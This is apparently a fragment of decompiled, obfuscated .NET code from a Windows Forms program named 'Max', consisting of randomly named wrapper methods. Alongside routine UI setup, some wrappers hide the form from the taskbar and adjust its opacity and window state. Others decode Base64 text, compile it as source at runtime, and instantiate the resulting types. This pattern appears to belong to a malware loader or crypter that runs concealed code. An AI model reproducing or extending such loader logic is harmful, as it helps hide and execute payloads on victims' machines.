		((Label)object_0).set_Text((string)object_1);
	}

	internal static object R2FRYa5iqdDcUhwHgl3(object object_0)
	{
		return ((Max)object_0).Label2;
	}

	internal static object jiiU8M5WOG6CMh00n5s(object object_0)
	{
		return ((Max)object_0).Label3;
	}

	internal static object T3nqV059Uktlus49t0b(object object_0)
	{
		return ((Max)object_0).LinkLabel1;
	}

	internal static void Kq8bFv5UWbZ7BYyWsEM(object object_0, bool bool_0)
	{
		((Label)object_0).set_TabStop(bool_0);
	}

	internal static void cDZ1ZK583yF1SUnOQ4t(object object_0, object object_1)
	{
		((LinkLabel)object_0).set_Text((string)object_1);
	}

	internal static void RvGtnS5ERs8XgunMKjF(object object_0, bool bool_0)
	{
		((PictureBox)object_0).set_TabStop(bool_0);
	}

	internal static object qacfHE5raBSR0rkw4eX(object object_0)
	{
		return ((Max)object_0).ProgressBar1;
	}

	internal static object vw6lIA5uSSSFq33hXXL(object object_0)
	{
		return ((Max)object_0).TextBox1;
	}

	internal static object oXKaYs5ASZWQWgDFLaB(object object_0)
	{
		return ((Max)object_0).RadioButton1;
	}

	internal static object tQufPp5YsTZMERCaXlm(object object_0)
	{
		return ((Max)object_0).RadioButton2;
	}

	internal static void WOPFHZ5svBvt50ZHKdE(object object_0, bool bool_0)
	{
		((RadioButton)object_0).set_TabStop(bool_0);
	}

	internal static object ffy8iI5xQOYYt9civ5o(object object_0)
	{
		return ((Max)object_0).GroupBox1;
	}

	internal static void YHXOX75DvgqPhr7rTZ0(object object_0, bool bool_0)
	{
		((GroupBox)object_0).set_TabStop(bool_0);
	}

	internal static void IXPMxA57SFM5YHJA2kN(object object_0, object object_1)
	{
		((GroupBox)object_0).set_Text((string)object_1);
	}

	internal static object CnoXj85hVruE7ubOkX3(object object_0)
	{
		return ((Max)object_0).Panel1;
	}

	internal static void uFeLa95mtWOHfxlZYqp(object object_0, SizeF sizeF_0)
	{
		((ContainerControl)object_0).set_AutoScaleDimensions(sizeF_0);
	}

	internal static void AACXQD5SHI5sFArBaMy(object object_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		((ContainerControl)object_0).set_AutoScaleMode(autoScaleMode_0);
	}

	internal static void rm2ihX5BlgUehUYfmlF(object object_0, Size size_0)
	{
		((Form)object_0).set_ClientSize(size_0);
	}

	internal static object e70pL55FoNALqPcYchB(object object_0)
	{
		return ((Control)object_0).get_Controls();
	}

	internal static void iTnEpl53Q5dC4PpOymr(object object_0, object object_1)
	{
		((ControlCollection)object_0).Add((Control)object_1);
	}

	internal static void Q55nNn54evmq7xKJ8gy(object object_0, double double_0)
	{
		((Form)object_0).set_Opacity(double_0);
	}

	internal static void xbqol75fJM9DRT3QZhW(object object_0, bool bool_0)
	{
		((Form)object_0).set_ShowInTaskbar(bool_0);
	}

	internal static void fyb2X25LDFD938d7LtB(object object_0, FormWindowState formWindowState_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		((Form)object_0).set_WindowState(formWindowState_0);
	}

	internal static void jPCUYC5JfClFEGZqROv(object object_0)
	{
		((ISupportInitialize)object_0).EndInit();
	}

	internal static void X4nBuA5GkxoaobpPyF7(object object_0, bool bool_0)
	{
		((Control)object_0).ResumeLayout(bool_0);
	}

	internal static void wEL7Lq5wwEZOr2b2KuY(object object_0)
	{
		((Control)object_0).PerformLayout();
	}

	internal static object pqOxwC5ZEMho2D2w9Wr()
	{
		return Encoding.Default;
	}

	internal static object fsKp7n56Ka3bXy36Olx(object object_0)
	{
		return Convert.FromBase64String((string)object_0);
	}

	internal static void ytmwsw5qSpEqq8nyMo6(object object_0)
	{
		ProjectData.SetProjectError((Exception)object_0);
	}

	internal static void ERvpJG51vGVwWQoP9Da()
	{
		ProjectData.ClearProjectError();
	}

	internal static object hIdkwl5zXJ0MBuXbHGw(object object_0)
	{
		return Cq.CompileSource((string)object_0);
	}

	internal static object g756GioaYfrQWxB9qtZ(object object_0)
	{
		return ((Assembly)object_0).GetTypes();
	}

	internal static bool LcFHvJo56ZNQSIEeqvr(object object_0, object object_1)
	{
		return ((string)object_0).EndsWith((string)object_1);
	}

	internal static object wf8X8CoogYOLDgvehAa(Type type_0)
	{
		return Activator.CreateInstance(type_0);
	}
}
